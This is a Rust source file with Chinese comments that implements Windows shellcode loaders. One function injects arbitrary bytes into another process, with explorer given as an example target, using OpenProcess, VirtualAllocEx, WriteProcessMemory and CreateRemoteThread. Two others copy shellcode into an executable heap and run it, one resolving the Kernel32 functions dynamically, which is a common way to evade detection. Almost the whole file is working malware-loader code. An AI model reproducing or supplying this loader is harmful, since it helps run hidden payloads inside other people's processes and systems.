use std::intrinsics::transmute;
use std::io::Error;
use std::os::raw::c_void;
use std::ptr;
use std::ptr::null_mut;
use libloading::{Library, Symbol};
use winapi::shared::minwindef::DWORD;
use windows_sys::Win32::Foundation::GetLastError;
use windows_sys::Win32::System::Memory::{HEAP_FLAGS, HeapAlloc, HeapCreate, HeapHandle};
use winapi::shared::ntdef::HANDLE;
use winapi::um::memoryapi::{VirtualAllocEx, WriteProcessMemory};
use winapi::um::processthreadsapi::{CreateRemoteThread, OpenProcess};
use windows_sys::Win32::System::Memory::{MEM_COMMIT, PAGE_EXECUTE_READWRITE};
use windows_sys::Win32::System::Threading::PROCESS_ALL_ACCESS;

/* 注入到进程 ， pid 为进程名
    // 根据程序名获取进程pid
    let s = System::new_all();
    let process_id: u32 = s
                                .processes_by_name("explorer")
                                .next()
                                .unwrap()
                                .pid()
                                .as_u32();
*/
pub unsafe fn inject_code(pid: u32, code: &[u8]) -> Result<(), Error> {
    let process: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
    if process.is_null() {
        return Err(Error::last_os_error());
    }

    let remote_memory = VirtualAllocEx(
        process,
        null_mut(),
        code.len(),
        MEM_COMMIT,
        PAGE_EXECUTE_READWRITE,
    );
    if remote_memory.is_null() {
        return Err(Error::last_os_error());
    }

    let mut bytes_written = 0;
    if WriteProcessMemory(
        process,
        remote_memory,
        code.as_ptr() as *const _,
        code.len(),
        &mut bytes_written,
    ) == 0
    {
        return Err(Error::last_os_error());
    }

    let thread = CreateRemoteThread(
        process,
        null_mut(),
        0,
        Some(std::mem::transmute(remote_memory)),
        null_mut(),
        0,
        null_mut(),
    );
    if thread.is_null() {
        return Err(Error::last_os_error());
    }

    Ok(())
}

// 加载shellcode 到内存中执行
pub unsafe  fn exec(code: &[u8]){
    let heap = HeapCreate(0x40000, 0, 0);
    let ptr = HeapAlloc(heap, 8, code.len());
    if GetLastError() == 0 {
        std::ptr::copy(
            code.as_ptr() as *const u8,
            ptr as *mut u8,
            code.len(),
        );
        let exec_function = transmute::<*mut c_void, fn()>(ptr);
        exec_function();
    }
}

// 动态加载dll，加载 HeapCreate 和 HeapAlloc 函数, 实现shellcode 执行
pub unsafe fn dll_exec(code: &[u8]) {
    let lib = Library::new("Kernel32.dll").unwrap();
    // 获取HeapCreate函数
    let heap_create: Symbol<unsafe extern "system" fn(DWORD, usize, usize) -> HeapHandle> = lib.get(b"HeapCreate").unwrap();
    // 获取HeapAlloc函数
    let heap_alloc: Symbol<unsafe extern "system" fn(HeapHandle, HEAP_FLAGS, usize) ->  *mut std::ffi::c_void> = lib.get(b"HeapAlloc").unwrap();
    // 创建 堆空间
    let heap = heap_create(0x40000, 0, 0);
    let heap_alloc: Symbol<unsafe extern "system" fn(HeapHandle, HEAP_FLAGS, usize) ->  *mut std::ffi::c_void> = lib.get(b"HeapAlloc").unwrap();
    let ptr = heap_alloc(heap, 8, code.len());
    if GetLastError() == 0 {
        ptr::copy(
            code.as_ptr() as *const u8,
            ptr as *mut u8,
            code.len(),
        );
        let exec_function = transmute::<*mut std::os::raw::c_void, fn()>(ptr);
        exec_function();
    }
}


